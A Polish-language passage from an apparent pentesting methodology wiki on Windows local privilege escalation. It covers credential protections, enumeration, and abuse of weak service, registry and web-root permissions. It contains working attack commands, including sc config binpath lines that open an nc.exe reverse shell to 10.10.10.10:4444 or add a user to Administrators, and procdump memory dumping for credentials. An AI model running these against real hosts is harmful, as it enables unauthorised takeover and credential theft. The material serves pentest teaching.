**LAPS** służy do **zarządzania hasłami lokalnych kont Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, co pozwala im wyświetlać lokalne hasła administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** tego procesu przez niezaufane procesy lub wstrzykiwania do niego kodu, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona danych uwierzytelniających przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zazwyczaj są ustanawiane poświadczenia domenowe użytkownika.\
[**Więcej informacji o buforowanych poświadczeniach**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do uprzywilejowanej grupy, możesz eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na następnej stronie dowiesz się, jakie tokeny mogą być przydatne i jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Pobierz zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim podczas wyświetlania procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** albo czy masz uprawnienia do zapisu w folderze z plikami binarnymi, aby wykorzystać potencjalne ataki [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), które można wykorzystać do eskalacji uprawnień.

Debugger może nasłuchiwać tylko przez krótki czas, dlatego brak go w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany nasłuchujący proces z jego PID-em, właścicielem i możliwością uzyskania do niego dostępu przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie dowodzi możliwości wykonania kodu z poziomu innego użytkownika. Rutynową enumerację prowadź pasywnie, nie wysyłając poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów zawierających pliki binarne procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocesorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token umożliwia tworzenie tam plików, ścieżkę warto sprawdzić pod kątem możliwości wykonania kodu przy następnym ładowaniu modułów przez zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta, na którym uruchamiany jest proces, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału sieciowego; sam zapis do katalogu nie dowodzi możliwości eskalacji. [Dokumentacja dynamic-preprocessor Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieciowa z zapisywalnym katalogiem dokumentów

W przypadku instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że moduł obsługi po stronie serwera przetwarza dany typ pliku; sam zapis do katalogu dowodzi jedynie możliwości tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja może znajdować się obok niego w `conf\httpd.conf`, z domyślnym katalogiem głównym `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź łącznie dokładną ścieżkę obrazu usługi, jej tożsamość uruchomieniową, efektywną wartość `DocumentRoot` (w tym rozwinięcie `${INSTALL_DIR}` i nadpisania konfiguracji virtual hostów) oraz ACL katalogu głównego. Katalog WAMP z prawem zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykonuje przesłany plik. [Apache opisuje, jak usługa systemu Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i sieciowa tożsamość puli aplikacji

W przypadku IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal przypisaną do niej pulę i handler po stronie serwera. Kod umieszczony w udostępnianym katalogu jest wykonywany jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest osiągalna. Przed uznaniem zapisywalnego katalogu za możliwość wykonania kodu sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler oraz nadpisania konfiguracji dla danej ścieżki.

Kompilacja dynamiczna ASP.NET to osobna ścieżka, którą należy sprawdzić: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może go zmienić. [Microsoft opisuje tę lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji sobie nie ufają](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach może zmieniać wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie go kompiluje, działając z bardziej uprzywilejowaną [tożsamością procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: powiąż pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej ponownej kompilacji. Ogranicz się do przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` często uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zwykle przedstawia w sieci anonimowe poświadczenia. Pula `SpecificUser` używa skonfigurowanego dla niej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [sieciową tożsamość puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się między generacjami IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu następuje w puli używającej sieciowej tożsamości komputera, sprawdź uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień do replikacji w kontekście nazewniczym domeny; sam bilet konta maszyny lub rola hosta nie dowodzą ich posiadania. Pasywna enumeracja powinna obejmować sprawdzenie konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i składanie polecenia. Handler, który dołącza zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakom powłoki na zmianę polecenia; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany wywołujący może rzeczywiście wpłynąć na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub podszywania się oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, nasłuchujący port localhost ani sama słabość formatu tokenu nie dowodzą możliwości uprzywilejowanego wykonania polecenia. Podczas pasywnej enumeracji przeglądaj kod źródłowy i konfigurację puli, nie wysyłając sfałszowanych żądań ani nie uruchamiając procesu pomocniczego.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie i przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php) może spowodować wykonanie zapisywalnego dla użytkownika o niższych uprawnieniach pliku PHP z uprawnieniami procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może zmodyfikować, a proces roboczy odczytać, że obowiązujące ograniczenia ścieżek PHP pozwalają na dołączenie oraz że proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący port loopback ani sam zapisywalny plik nie dowodzą istnienia tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików, nie wywołując endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP mają **poświadczenia zapisane w pamięci jawnym tekstem**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niebezpieczne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu zrzutu, do którego zapis może uzyskać użytkownik o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importera. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów w Ghidrze](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importera, jeśli pozwalały na to [zasady ruchu wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop wskazujący na możliwość ujawnienia poświadczeń, a nie bezpośrednie uzyskanie dostępu administratora: odpowiedź musi dać się wykorzystać osobną, autoryzowaną lub podatną ścieżką, a aktualne kompilacje należy oceniać na podstawie faktycznego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź proces importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) obiektu Service Control Manager (SCM) jest niezależne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest wskazówką do dalszej weryfikacji, a nie dowodem, że można uruchomić nową usługę. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobną kontrolę dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny lokalny lub zdalny token, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalowania usługi powiąż te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** może zapisywać, jego bazowym ACL NTFS oraz lokalną ścieżką do pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umożliwiająca umieszczenie pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale albo sama wskazówka dotycząca prawa SCM do tworzenia usług nie dowodzą, że nowa usługa może zostać uruchomiona z wyższymi uprawnieniami.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocnika jest rozwiązywana do katalogu, do którego może zapisywać użytkownik o niższych uprawnieniach, a usługa działa z wyższymi uprawnieniami, brakujący plik pomocnika może być kandydatem do warunkowego zastąpienia. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pomocnika**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogów, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzą, że usługa załaduje ten plik; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to inne prawo niż [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy osobny uprzywilejowany konsument lub loader akceptuje ten plik; sam zapisywalny dziennik lub prawo do uruchomienia nie wystarczają. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, jeśli można go odczytać, jest **wskazówką do przeglądu konfiguracji**: może zawierać dane logowania do interfejsu WWW, a `boot.ini` może przekierować konfigurację w inne miejsce. Sprawdź rzeczywiste konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonywania), efektywnego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza uruchamiającego je w kontekście tożsamości usługi. Nasłuch tylko na interfejsie loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub nasłuchujący interfejs nie dowodzą posiadania tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania API WWW. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące bezpieczeństwa interfejsu WWW i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto uruchomieniowe usługi oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację podrzędną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), a `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji podrzędnej i ACL jej katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację to osobna wskazówka do dalszej weryfikacji: potwierdź, że użytkownik o niższych uprawnieniach może dotrzeć do nasłuchującego endpointu, że dokładna operacja przyjmuje jego dane wejściowe oraz że proces podrzędny usługi wykonuje niebezpieczną operację z wyższymi uprawnieniami. Samo konto usługi, URL endpointu lub ścieżka z prawem zapisu nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia potok](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript`, wykonywana w kontekście tożsamości usługi o wyższych uprawnieniach, stanowi granicę wykonywania kodu; sam nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niezwiązanym zestawie nie są dowodem. Podczas rozpoznania statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując endpointu.

Service Triggers pozwalają systemowi Windows uruchamiać usługi po wystąpieniu określonych warunków (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność IP, podłączenie urządzenia, odświeżenie GPO itd.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wyzwalając ich triggery. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa kolektora diagnostycznego Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystywało junction i wyścig z linkiem object managera do przekierowania resetowania DACL usługi. Wykazana eskalacja wymagała również użytecznej ścieżki naprawy MSI dla dostawcy WMI programu Visual Studio Setup oraz jej celu `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten komponent został naprawiony w styczniu 2024 r.

Podczas pasywnej weryfikacji wstępnej sprawdź konto i ścieżkę pliku binarnego tej usługi, ustal, czy istnieje ścieżka kompilatora Setup WMI, oraz zweryfikuj stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Nie trzeba uruchamiać usługi ani wykonywać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie narzędzia binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować dowolną usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP tutaj](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych skojarzonych z nią urządzeń._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Pamiętaj, że usługa upnphost wymaga do działania SSDPSRV (w przypadku XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja pliku binarnego wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponowne uruchomienie usługi

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę konfiguracji uprawnień, co pozwala zmieniać konfiguracje usług.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę konfiguracji uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usług.
- **GENERIC_ALL**: Również zapewnia możliwość zmiany konfiguracji usług.

Do wykrywania i wykorzystywania tej podatności można użyć modułu _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć usługę, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** albo czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Wszystkie pliki binarne uruchamiane przez usługę możesz wyświetlić za pomocą **wmic** (poza system32), a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz też użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Sprawdź, czy niebezpieczne ACL przyznają **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`** uprawnienia, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się on znajduje. Praktyczny scenariusz nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy można zapisywać plik binarny, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom usługę ponownie za pomocą `sc stop <service_name> && sc start <service_name>` (albo zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi jej ponownie uruchomić, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma skonfigurowaną akcję ponownego uruchomienia po awarii albo można ją wywołać pośrednio za pomocą korzystającej z niej aplikacji.

### Uprawnienia do modyfikacji rejestru usług

Sprawdź, czy możesz modyfikować rejestr którejkolwiek usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w rejestrze dla klucza danej usługi. Sam wpis ACL nie dowodzi, że dostęp jest skuteczny: znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień obiektu usługi `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Eskalacja wymaga również użytecznego pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację firmy Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do uruchamianego pliku binarnego:

```bash
